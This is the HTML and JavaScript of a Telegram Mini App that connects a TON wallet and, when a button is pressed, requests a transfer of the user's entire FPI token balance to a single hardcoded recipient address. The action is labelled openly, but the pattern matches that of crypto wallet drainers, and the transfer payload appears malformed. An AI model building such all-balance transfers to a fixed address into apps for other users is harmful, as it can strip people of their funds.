<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
    style-src 'self' 'unsafe-inline' https://unpkg.com;
    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
    font-src 'self' https://unpkg.com;
    img-src * data:;
  ">

  <title>Telegram Mini App: TON Connect Jetton Transfer</title>

  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех токенов FPI</h1>

  <div id="ton-connect"></div>

  <button id="sendTransaction">Отправить все FPI</button>

  <script>
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg)
        }
      };
    } else {
      Telegram.WebApp.ready();
    }

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    async function getJettonBalance(walletAddress, jettonMasterAddress) {
      const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/jettons`);
      const data = await response.json();
      const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
      return jetton ? jetton.balance : "0";
    }

    async function getJettonWalletAddress(userAddress, jettonMasterAddress) {
      const response = await fetch(`https://tonapi.io/v2/jettons/${jettonMasterAddress}/wallets/${userAddress}`);
      const data = await response.json();
      return data.address;
    }

    async function sendJettonTransaction(jettonWalletAddress, recipientAddress, amount) {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: jettonWalletAddress,
            amount: "50000000",
            payload: {
              type: "jetton_transfer",
              query_id: 0,
              amount: amount,
              destination: recipientAddress,
              response_destination: null,
              custom_payload: null,
              forward_ton_amount: "0",
              forward_payload: null
            }
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Jetton транзакция отправлена:", result);
        Telegram.WebApp.showAlert("Jetton транзакция отправлена: " + JSON.stringify(result));
      } catch (error) {
        console.error("Ошибка транзакции:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    async function sendAllFPI() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
        return;
      }

      const userWalletAddress = tonConnectUI.wallet.account.address;
      const jettonMasterAddress = "EQCuPm01HldiduQ55xaBF_1kaW_WAUy5DHey8suqzU_MAJOR";
      const recipientAddress = "UQDlN_V6Eaj3ac60yvc3tWa75pnAXNVdmHF3OL71er9PEBRd";

      const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);

      if (balance === "0") {
        Telegram.WebApp.showAlert("У вас нет токенов FPI.");
        return;
      }

      const jettonWalletAddress = await getJettonWalletAddress(userWalletAddress, jettonMasterAddress);

      await sendJettonTransaction(jettonWalletAddress, recipientAddress, balance);
    }

    document.getElementById("sendTransaction").addEventListener("click", sendAllFPI);
  </script>
</body>
</html>
